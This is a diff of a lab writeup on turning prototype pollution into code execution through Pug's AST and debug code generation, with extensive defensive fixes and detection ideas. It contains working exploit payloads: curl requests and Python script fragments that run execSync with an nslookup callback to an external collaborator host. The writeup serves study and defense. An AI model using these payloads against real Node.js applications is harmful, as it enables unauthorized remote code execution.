@@ -5,46 +5,81 @@ category: "web-security"
 difficulty: "advanced"
 source: "7heKnight Research"
 tags: [nodejs, pug, prototype-pollution, ast-injection, rce, web-security]
-excerpt: "A rebuilt research note on turning Prototype Pollution into code execution through Pug's AST/code-generation path, with a controlled lab, debugger observations, exploit shape and defensive notes."
+excerpt: "A detailed lab note on turning Prototype Pollution into code execution through Pug's AST/code-generation path: vulnerable merge, prototype chain behavior, debugger observations, exploit shape, trigger conditions and defenses."
 cover: "/writeups/ast-injection-through-pug/AST_FinalResult.png"
 draft: false
 ---
 
 > Authorization note: this writeup uses a deliberately vulnerable local lab.
 > Only reproduce these techniques in environments you own or are explicitly
-> authorized to test.
+> authorized to test. The point is to understand the bug class and how to
+> defend against it, not to test random Node.js applications on the internet.
 
-## Background
+## TL;DR
 
-This research started from an interview-style lab that grouped several web
-vulnerabilities together: race conditions, Text4Shell and Prototype Pollution.
-The Prototype Pollution machine was the one that stayed in my head, because it
-was not only changing object behavior - it was being used to reach code
-execution.
+The bug chain is:
 
-After the lab, I followed a public post about AST Injection in Pug and rebuilt
-the technique locally. The goal of this note is to document the chain clearly:
+```text
+unsafe recursive merge
+  -> Object.prototype pollution
+  -> inherited AST-looking properties become visible to Pug
+  -> Pug debug code generation emits node.line into generated JavaScript
+  -> attacker-controlled JavaScript executes during template compilation
+```
 
-- where the vulnerable merge happens;
-- how polluted prototype properties reach Pug's internal AST;
-- why `debug: true` changes the generated JavaScript;
-- how the payload shape evolves from a debugger observation into a practical
-  proof of concept;
-- what should be fixed to prevent this class of bug.
+The exploit is not "Pug is always RCE". The exploit needs the right set of
+conditions:
 
-## Vulnerability Chain
+1. The application accepts attacker-controlled object keys.
+2. The application recursively merges those keys into a normal JavaScript
+   object.
+3. The merge allows prototype-changing keys such as `__proto__`,
+   `constructor` or `prototype`.
+4. The polluted process later compiles a Pug template.
+5. The Pug compile path uses debug behavior where `node.line` is embedded into
+   generated JavaScript.
 
-The chain is easier to reason about as four steps:
+When those pieces line up, a JSON request can poison the Node.js process, and a
+later template compilation can become code execution.
 
-1. The application accepts attacker-controlled JSON.
-2. A recursive merge copies that JSON into a normal JavaScript object.
-3. A `__proto__` key pollutes `Object.prototype`.
-4. Pug later compiles a template and reads inherited AST-like properties during
-   code generation.
+## Why This Was Interesting
 
-Prototype Pollution is the bug that gives us influence over inherited object
-properties. AST Injection is the compiler-side consequence: the template engine
-mistakes attacker-controlled inherited data for part of the syntax tree.
+This research started from an interview-style lab that chained several web
+security topics: race conditions, Text4Shell and Prototype Pollution. The
+Prototype Pollution part was the one that stayed in my head because the impact
+was not just "some object has a weird property now". The pollution crossed a
+trust boundary and influenced a compiler.
+
+That distinction matters. A lot of Prototype Pollution examples stop at:
+
+```javascript
+({}).polluted === true
+```
+
+That proves the primitive, but it does not explain the impact. The real
+question is: what sensitive code will read the polluted property later?
+
+In this lab, the sensitive reader is Pug's compiler. Pug parses template text
+into an Abstract Syntax Tree (AST), walks that tree, and emits JavaScript. If
+attacker-controlled inherited properties are treated as AST fields, the
+attacker has a path from "object property pollution" to "code generation".
+
+## Mental Model
+
+Keep three layers separate:
+
+| Layer | What goes wrong | Why it matters |
+|---|---|---|
+| Application layer | Unsafe merge writes attacker keys into an object | This creates the pollution primitive |
+| JavaScript runtime layer | `Object.prototype` gains attacker-controlled properties | New ordinary objects can inherit those properties |
+| Compiler layer | Pug walks objects and generates JavaScript from AST fields | Polluted fields can reach a code-generation sink |
+
+The exploit does not need to control the Pug template itself. It only needs the
+same Node.js process to compile any Pug template after the prototype has been
+polluted.
+
+That is the uncomfortable part: the request that creates the bug and the
+request that triggers the impact can be different.
 
 ## Lab Setup
 
@@ -125,23 +160,177 @@ npm install
 node index.js
 ```
 
-The dangerous part is the `merge()` function. It recursively assigns arbitrary
-keys from the request body and does not block `__proto__`, `constructor` or
-`prototype`. Because `object` is a normal object, writing through `__proto__`
-can affect objects created elsewhere in the same process.
+There are two important application behaviors:
+
+1. `POST /vulnerable` parses attacker-controlled JSON and passes it to
+   `merge(object, req.body)`.
+2. `GET /` calls `pug.compile('7heknight', { debug: true })`.
+
+Those two routes do not look connected. That is exactly why Prototype Pollution
+is easy to underestimate: it creates process-wide side effects through shared
+prototypes.
+
+## The Vulnerable Merge
+
+The vulnerable part is this function:
+
+```javascript
+function merge(target, source) {
+  for (const key in source) {
+    if (isObject(target[key]) && isObject(source[key])) {
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+
+  return target;
+}
+```
+
+At first glance, it looks like normal recursive merge logic. The problem is
+that it trusts every key from `source`.
+
+Three details make it dangerous.
+
+### 1. It iterates attacker-controlled keys
+
+`for (const key in source)` walks enumerable keys. If the request body contains
+`"name"`, `"theme"`, `"debug"`, or `"__proto__"`, the function handles all of
+them as normal keys.
+
+There is no denylist:
+
+```javascript
+if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+  throw new Error('dangerous key');
+}
+```
+
+There is also no schema validation that says which keys are expected.
+
+### 2. It reads `target[key]` before deciding what to do
+
+This line is subtle:
+
+```javascript
+if (isObject(target[key]) && isObject(source[key])) {
+```
+
+When `key` is `"__proto__"` and `target` is a normal object, `target[key]`
+does not behave like an ordinary data field. It reaches the special prototype
+accessor on `Object.prototype`. In practice, `target["__proto__"]` points to
+the object's prototype.
+
+For a fresh object:
+
+```javascript
+const object = {};
+object.__proto__ === Object.prototype; // true
+```
+
+So the merge does not simply assign a harmless `"__proto__"` property. It can
+descend into the prototype object itself.
+
+### 3. It treats functions as mergeable objects
+
+The helper is also loose:
+
+```javascript
+function isObject(obj) {
+  return typeof obj === 'function' || typeof obj === 'object';
+}
+```
+
+It returns true for objects, functions and also `null` because
+`typeof null === 'object'`. This lab does not rely on the `null` case, but it
+shows the function is not a careful type guard. A safer helper would at least
+reject `null` and arrays, then still block prototype keys separately.
+
+## Proving Prototype Pollution
+
+A minimal pollution request looks like this:
+
+```json
+{
+  "__proto__": {
+    "polluted": "yes"
+  }
+}
+```
+
+Send it to the vulnerable route:
+
+```bash
+curl -s http://127.0.0.1:4000/vulnerable \
+  -H 'Content-Type: application/json' \
+  -d '{"__proto__":{"polluted":"yes"}}'
+```
+
+Inside the process, the effect is equivalent to:
+
+```javascript
+Object.prototype.polluted = 'yes';
+```
+
+A quick local check:
+
+```javascript
+const object = {};
+merge(object, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
+
+console.log({}.polluted); // yes
+```
+
+This is already a vulnerability, but not yet the final impact. Now we need a
+sensitive consumer of inherited properties.
 
 ## What Is an AST?
 
-An Abstract Syntax Tree (AST) is a structured representation of source code.
-Template engines such as Pug parse template text into an AST, then walk that AST
-to generate JavaScript.
+An Abstract Syntax Tree is a structured representation of source code. Instead
+of treating code as one long string, a parser turns it into nodes.
+
+A tiny Pug template:
+
+```pug
+h1= msg
+```
+
+is represented internally as a tree with nodes that describe the tag, the code
+expression, child blocks, line numbers and other metadata.
 
 ![AST overview](/writeups/ast-injection-through-pug/AST0.jpg)
 
-In a safe compiler pipeline, only the lexer and parser should create trusted AST
-nodes. The interesting failure here is that polluted prototype properties can
-look like extra AST fields during code generation. If the compiler does not
-strictly check ownership and type, inherited data can influence generated code.
+A simplified AST shape might look like:
+
+```json
+{
+  "type": "Block",
+  "nodes": [
+    {
+      "type": "Tag",
+      "name": "h1",
+      "block": {
+        "type": "Block",
+        "nodes": [
+          {
+            "type": "Code",
+            "val": "msg",
+            "buffer": true,
+            "line": 1
+          }
+        ]
+      }
+    }
+  ]
+}
+```
+
+The compiler then walks this tree and emits JavaScript that renders HTML.
+
+The safety expectation is simple: trusted parser code creates trusted AST
+nodes. User-controlled inherited properties should not be accepted as if they
+were parser-created fields.
 
 ## Walking Pug's Compile Path
 
@@ -159,8 +348,8 @@ The exported `pug` object exposes several compile helpers, including
 
 ![Pug library exports](/writeups/ast-injection-through-pug/pug_library.png)
 
-Stepping into `compileFile()` shows that the function mostly handles file
-loading and cache behavior before delegating back into the common compile path.
+`compileFile()` mostly handles file loading, filename normalization and cache
+behavior. After that, execution returns to the common compile path.
 
 ![Pug compileFile](/writeups/ast-injection-through-pug/pug0.png)
 
@@ -168,43 +357,102 @@ Inside `handleTemplateCache()`, execution reaches `compile()`.
 
 ![Pug template cache path](/writeups/ast-injection-through-pug/pug1.png)
 
-`compile()` then calls `compileBody()`, where Pug creates the AST and passes it
-into code generation.
+`compile()` then calls `compileBody()`, where Pug parses the template and sends
+the AST to code generation.
 
 ![Pug compile body](/writeups/ast-injection-through-pug/pug2.png)
 
-The key flow is:
+The high-level path is:
 
 ```text
 pug.compile()
   -> compileBody()
+  -> lex/parse template text into an AST
   -> generateCode(ast, options)
-  -> pug-code-gen Compiler
-  -> visit(node)
+  -> new Compiler(ast, options)
+  -> compiler.compile()
+  -> compiler.visit(node)
 ```
 
 Following `generateCode()` leads into `node_modules/pug-code-gen/index.js`.
 
 ![Pug code generator exports](/writeups/ast-injection-through-pug/pug_generator0.png)
 
-The compiler walks each node through `visit()`.
+The compiler's core job is to visit nodes by type. Conceptually:
+
+```javascript
+visit(node) {
+  const debug = this.debug;
+
+  if (debug && node.debug !== false && node.line) {
+    this.buf.push('pug_debug_line = ' + node.line + ';');
+  }
+
+  this['visit' + node.type](node);
+}
+```
+
+That is not a full copy of the implementation, but it captures the important
+behavior: when debug mode is active, Pug emits code that assigns the current
+template line number to `pug_debug_line`.
 
 ![Pug visit function](/writeups/ast-injection-through-pug/pug_generator1.png)
 
-With debug mode enabled, the generated function tracks template line numbers.
-The relevant behavior is that `node.line` is placed into generated JavaScript as
-part of `pug_debug_line`.
+With normal parser-created AST nodes, `node.line` is a number:
+
+```javascript
+pug_debug_line = 1;
+```
+
+With polluted attacker-controlled data, `node.line` can be a JavaScript
+expression:
+
+```javascript
+pug_debug_line = console.log(process.version);
+```
+
+That is the sink.
 
 ![Pug debug line generation](/writeups/ast-injection-through-pug/pug_generator2.png)
 
-That is the sink. If attacker-controlled data can become `node.line`, and that
-data is treated as JavaScript rather than a numeric line value, the compiler can
-emit attacker-controlled code.
+## Why `debug: true` Matters
+
+Pug's debug mode exists to make template errors easier to understand. It tracks
+where execution is inside the original template so stack traces can point back
+to template lines.
+
+For a normal node, debug code is useful and harmless:
+
+```javascript
+pug_debug_line = 1;
+```
+
+The dangerous behavior is not the variable itself. The dangerous behavior is
+that a value derived from an AST field is concatenated into generated
+JavaScript.
+
+If `node.line` is assumed to be numeric but is actually attacker-controlled
+source text, the generated function changes meaning.
+
+Safe mental model:
+
+```text
+line number data -> generated JavaScript data assignment
+```
+
+Exploit mental model:
+
+```text
+attacker JavaScript string -> generated JavaScript code
+```
+
+That is why this chain is compiler-side injection rather than just object
+mutation.
 
 ## First Proof of Concept
 
-The first local test pollutes `Object.prototype.block` with an AST-looking
-object:
+Before using HTTP, it is easier to prove the behavior directly in a standalone
+Node.js script:
 
 ```javascript
 const pug = require('pug');
@@ -217,8 +465,11 @@ Object.prototype.block = {
 pug.compile('h1= msg', { debug: true });
 ```
 
-The resulting compiled function contains the injected expression in the debug
-line assignment:
+The important part is `Object.prototype.block`. We are not editing Pug's real
+AST object directly. We are adding a property that ordinary objects can inherit
+when code later asks for `.block`.
+
+The generated code now contains the injected expression in a debug assignment:
 
 ```javascript
 pug_debug_line = console.log(
@@ -226,21 +477,26 @@ pug_debug_line = console.log(
 );
 ```
 
-That confirms the important part of the chain: the polluted property can cross
-from object prototype state into Pug's generated JavaScript.
+That confirms the chain:
+
+1. An inherited property can be visible during AST traversal.
+2. The inherited property can contain AST-looking data.
+3. A field from that data can land in generated JavaScript.
 
 ![Compiled output comparison](/writeups/ast-injection-through-pug/pug_compares0.png)
 
+This first proof of concept is useful, but it still feels a little magical.
+The next step is understanding which object shape Pug expects while walking the
+tree.
+
 ## Debugging the Better Payload Shape
 
-The first proof of concept works, but I wanted to understand why the final
-payload in the public post had a slightly different shape. While stepping
-through Pug, I found `visitCode()`, the function responsible for processing
-`Code` nodes.
+While stepping through Pug, I found `visitCode()`, the function responsible for
+processing `Code` nodes.
 
 ![Pug visitCode function](/writeups/ast-injection-through-pug/AST_VisitCode0.png)
 
-At runtime, the `code` object looked like this:
+At runtime, the `Code` node looked like this:
 
 ![Runtime Code node](/writeups/ast-injection-through-pug/AST_VisitCode1.png)
 
@@ -262,11 +518,14 @@ Represented as JSON-style data:
 }
 ```
 
-That observation explains the optimized exploit shape. Instead of trying to
-recreate a full node manually, we can pollute the properties Pug will consult
-while visiting the AST.
+The key observation is that a `Code` node can have a `block`. If Pug visits a
+code node and then follows a `block` property, a polluted inherited `block`
+can become part of the traversal.
 
-## Optimized Local Exploit
+The payload does not need to recreate the entire AST. It only needs to provide
+the properties Pug will look up at the right moment.
+
+## The Optimized Local Exploit
 
 Based on the debugger output, the local exploit becomes:
 
@@ -282,19 +541,107 @@ Object.prototype.code = {};
 pug.compile('h1', { debug: true });
 ```
 
+The two polluted keys serve different purposes:
+
+| Key | Purpose |
+|---|---|
+| `code` | Helps shape the traversal so Pug processes a code-related path |
+| `block` | Provides an inherited AST-like node with a malicious `line` field |
+
+The `block` object says:
+
+```json
+{
+  "type": "Text",
+  "line": "<JavaScript expression>"
+}
+```
+
+The `type` value matters because the compiler dispatches visitors by node type.
+The `line` value matters because debug code generation emits it into the
+compiled function.
+
 ![Local AST result](/writeups/ast-injection-through-pug/AST_Result.png)
 
-The simplified version still reaches the same sink and executes during Pug's
-compile phase.
+The result is command execution during Pug's compile phase.
 
 ![Final local AST result](/writeups/ast-injection-through-pug/AST_FinalResult.png)
 
-## Exploiting the Lab Server
+## Moving From Local Script to HTTP
 
-On the lab server, the exploit has two phases:
+The lab server gives us the same primitive through JSON:
+
+```javascript
+app.post('/vulnerable', function (req, res) {
+  const object = {};
+
+  try {
+    merge(object, req.body);
+    res.json(object);
+  } catch (error) {
+    process.exit();
+  }
+});
+```
+
+So the exploit has two HTTP phases:
 
 1. Send a polluted JSON body to `/vulnerable`.
-2. Trigger `/` so the server compiles the Pug template.
+2. Trigger `/` so the server compiles the Pug template in the polluted process.
+
+The routes are separate because pollution persists in memory. As long as the
+same Node.js process handles both requests, the second request can observe the
+side effect created by the first request.
+
+### Phase 1: Pollute the prototype
+
+The JSON body:
+
+```json
+{
+  "__proto__": {
+    "code": {},
+    "block": {
+      "type": "Text",
+      "line": "process.mainModule.require('child_process').execSync('nslookup ast-injection.example.oastify.com')"
+    }
+  }
+}
+```
+
+Send it:
+
+```bash
+curl -s http://127.0.0.1:4000/vulnerable \
+  -H 'Content-Type: application/json' \
+  -d '{"__proto__":{"code":{},"block":{"type":"Text","line":"process.mainModule.require('\''child_process'\'').execSync('\''nslookup ast-injection.example.oastify.com'\'')"}}}'
+```
+
+After this request, the process has polluted inherited properties:
+
+```javascript
+({}).code;
+({}).block;
+```
+
+### Phase 2: Trigger Pug compilation
+
+The trigger is just a request to `/`:
+
+```bash
+curl -i http://127.0.0.1:4000/
+```
+
+That route executes:
+
+```javascript
+const template = pug.compile('7heknight', { debug: true });
+```
+
+The compilation happens after the pollution, so Pug's compiler can see the
+inherited AST-like data.
+
+## Python Exploit Script
 
 A controlled outbound DNS lookup is enough to prove command execution without
 requiring an interactive shell.
@@ -322,13 +669,15 @@ payload = {
 print(f'[+] Polluting prototype through {TARGET_URL}/vulnerable')
 pollute = requests.post(TARGET_URL + '/vulnerable', proxies=proxy, json=payload)
 print(f'[+] POST status: {pollute.status_code}')
+print(f'[+] Response: {pollute.text[:200]}')
 
 print(f'[+] Triggering Pug compilation through {TARGET_URL}/')
 trigger = requests.get(TARGET_URL + '/', proxies=proxy)
 print(f'[+] GET status: {trigger.status_code}')
+print(f'[+] Response length: {len(trigger.text)}')
 ```
 
-The same object can also be represented with the `block` nested under `code`:
+The same object can also be represented with `block` nested under `code`:
 
 ```json
 {
@@ -343,6 +692,10 @@ The same object can also be represented with the `block` nested under `code`:
 }
 ```
 
+Depending on the exact Pug path and version, one shape may be easier to reach
+than the other. The debugging step above is what tells you which property
+lookup the compiler actually performs.
+
 After triggering the template compilation route, the collaborator received the
 DNS interaction.
 
@@ -355,51 +708,228 @@ process context.
 
 ![Lab callback validation](/writeups/ast-injection-through-pug/reverse_shell.png)
 
+## Why the Response From `/vulnerable` May Look Harmless
+
+The `/vulnerable` route returns `res.json(object)`. That can mislead you during
+testing because polluted prototype properties may not appear as own properties
+on `object`.
+
+For example:
+
+```javascript
+const object = {};
+merge(object, payload);
+console.log(object); // may look empty
+console.log({}.block); // polluted inherited property exists
+```
+
+JSON serialization normally includes own enumerable properties, not inherited
+ones. So a clean-looking JSON response does not prove the merge was safe.
+
+Better checks during local debugging:
+
+```javascript
+console.log(Object.prototype.block);
+console.log({}.block);
+console.log(Object.hasOwn({}, 'block')); // false
+```
+
+The last line is especially important. The property is dangerous because it is
+inherited, not because every object suddenly owns its own `block` field.
+
 ## Root Cause
 
-The vulnerability is not "Pug equals RCE" by itself. The exploit needs a
-specific combination:
+The root cause has two sides.
 
-- an unsafe recursive merge or assignment primitive;
-- attacker control over `__proto__`, `constructor` or `prototype`;
-- later use of polluted objects by sensitive code;
-- Pug compilation with debug behavior that emits `node.line` into generated
-  JavaScript.
+Application-side root cause:
 
-The application bug is the prototype pollution primitive. Pug's compiler path is
-the impact amplifier.
+- untrusted JSON is recursively merged;
+- special prototype keys are not blocked;
+- the merge target is a normal `{}` object;
+- there is no schema that limits the shape of accepted input.
 
-## Defensive Notes
+Compiler-side impact path:
 
-The most important fix is to remove the pollution primitive:
+- Pug compiles templates by walking AST nodes;
+- debug mode emits `node.line` into generated JavaScript;
+- polluted inherited fields can masquerade as AST fields;
+- code generation treats the value as source text, not inert data.
 
-- reject `__proto__`, `constructor` and `prototype` in user-controlled object
-  keys;
-- avoid custom recursive merge logic for untrusted input;
-- use hardened merge libraries and keep dependencies updated;
-- create dictionaries with `Object.create(null)` when prototype inheritance is
-  not needed;
-- validate JSON schemas before merging;
-- avoid compiling templates dynamically from request-driven state;
-- disable unnecessary debug behavior in production;
-- run Node.js services with least privilege and egress monitoring.
+The most important practical lesson: Prototype Pollution is rarely the final
+impact by itself. It becomes severe when polluted properties are consumed by
+powerful code: template engines, serializers, validators, ORMs, configuration
+loaders, access-control checks, logging systems, or anything that generates
+code or commands.
 
-For detection, look for suspicious request bodies containing keys such as
-`__proto__`, deeply nested `constructor.prototype`, or AST-shaped properties
-like `type`, `block`, `line` and `code`.
+## Common Pitfalls While Reproducing
 
-## Takeaways
+### The payload was sent, but nothing happened
 
-Prototype Pollution becomes dangerous when polluted properties cross into code
-that treats object shape as trusted. Template engines, serializers, validators
-and compilers are high-value places to review because they often walk complex
-objects and generate behavior from them.
+Check whether the same Node.js process handled both requests. If the app runs
+behind clustering, workers, hot reload, serverless isolation or a process
+manager that restarts between requests, the pollution may not survive to the
+trigger request.
 
-For this lab, the shortest explanation is:
+### The app returns `{}` from `/vulnerable`
+
+That does not mean pollution failed. Inspect inherited properties in the
+process, or use an observable trigger such as DNS.
+
+### The exploit works locally but not remotely
+
+Check these conditions:
+
+- Is the target actually using Pug?
+- Does it compile templates after the pollution request?
+- Is debug compilation enabled?
+- Is the vulnerable merge reachable with JSON?
+- Are dangerous keys filtered by middleware?
+- Is the Node.js version or Pug version different?
+- Is outbound DNS or HTTP blocked?
+
+### `process.mainModule` is undefined
+
+Some Node.js versions or execution modes may not expose `process.mainModule` in
+the same way. For a lab, you can use another path to `child_process` if the
+runtime allows it. For a real assessment, treat this as an environment detail
+and validate only inside the authorized scope.
+
+## Defensive Fixes
+
+The best fix is to remove the pollution primitive. Do not rely on the template
+engine to save an already-polluted process.
+
+### 1. Reject dangerous keys
+
+Block prototype-changing keys before merging:
+
+```javascript
+const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
+
+function assertSafeKey(key) {
+  if (DANGEROUS_KEYS.has(key)) {
+    throw new Error(`Blocked unsafe key: ${key}`);
+  }
+}
+```
+
+Apply the check recursively, not only at the top level. Attackers can place
+dangerous keys deep inside an object.
+
+### 2. Prefer schema validation over arbitrary merge
+
+Instead of accepting any object shape, define the shape:
+
+```javascript
+const allowed = {
+  username: body.username,
+  theme: body.theme,
+  notifications: {
+    email: body.notifications?.email === true
+  }
+};
+```
+
+This is less flexible, but safer. Most application endpoints do not need to
+merge arbitrary nested objects from users.
+
+### 3. Use null-prototype dictionaries where appropriate
+
+If you need a plain key-value map, use:
+
+```javascript
+const dict = Object.create(null);
+```
+
+Objects created this way do not inherit from `Object.prototype`, so inherited
+polluted fields such as `block` or `code` are not visible on them.
+
+This is not a complete application-wide fix, but it reduces exposure for data
+structures that are supposed to be dictionaries.
+
+### 4. Use ownership checks while walking structured data
+
+When walking compiler-like or schema-like objects, prefer own-property checks:
+
+```javascript
+if (Object.hasOwn(node, 'line')) {
+  // use node.line
+}
+```
+
+Do not treat inherited properties as trusted structure.
+
+### 5. Do not compile templates dynamically in production paths
+
+If possible, precompile templates at build time or application startup. Avoid
+request-driven template compilation, especially after handling untrusted input.
+
+### 6. Disable unnecessary debug behavior in production
+
+Debug features are useful locally, but they often increase the amount of
+metadata, reflection, code generation or stack-trace detail exposed at runtime.
+In this chain, debug behavior is the reason `node.line` becomes a codegen sink.
+
+### 7. Reduce blast radius
+
+Even with application fixes, run the service with least privilege:
+
+- no unnecessary filesystem write access;
+- no sensitive cloud metadata access;
+- restricted outbound traffic where possible;
+- separate secrets from the web process;
+- logging for suspicious JSON keys and unexpected child process execution.
+
+## Detection Ideas
+
+For request telemetry, look for JSON bodies containing:
 
 ```text
-unsafe merge -> Object.prototype pollution -> inherited AST fields -> Pug debug codegen -> command execution
+__proto__
+constructor
+prototype
+constructor.prototype
 ```
+
+For this specific AST Injection path, also watch for suspicious combinations:
+
+```text
+type
+line
+block
+code
+mustEscape
+buffer
+```
+
+The presence of `type` or `line` alone is not malicious. The signal becomes
+stronger when those keys appear inside prototype-changing paths.
+
+Runtime indicators may include:
+
+- unexpected calls to `child_process.exec`, `execSync`, `spawn` or `fork`;
+- outbound DNS/HTTP from a service that normally does not make such requests;
+- template compilation errors containing strange line values;
+- sudden changes in behavior across unrelated routes in the same process.
+
+## Final Takeaways
+
+Prototype Pollution is a primitive. The exploitability depends on what the
+polluted properties influence later.
+
+In this lab, the powerful consumer is Pug's compiler:
+
+```text
+polluted prototype property
+  -> inherited AST-looking field
+  -> debug line code generation
+  -> JavaScript execution
+```
+
+The important review habit is to ask: after untrusted input is merged, which
+parts of the application later trust object shape? If the answer includes a
+compiler, template engine, authorization check or command builder, the bug
+deserves serious attention.
 
 ## References
 
